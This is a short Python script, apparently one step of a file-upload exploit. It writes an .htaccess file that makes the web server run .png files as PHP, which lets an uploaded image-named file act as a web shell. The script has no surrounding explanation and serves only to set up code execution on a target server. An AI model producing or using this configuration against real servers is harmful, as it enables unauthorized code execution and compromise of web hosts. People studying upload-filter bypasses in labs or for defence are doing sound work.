#!/usr/bin/env python3

def create_htaccess():
    htaccess_content = '''
AddType application/x-httpd-php .png
php_flag engine on
'''
    
    with open('.htaccess', 'w') as f:
        f.write(htaccess_content)
    print("[+] Created .htaccess file")

create_htaccess()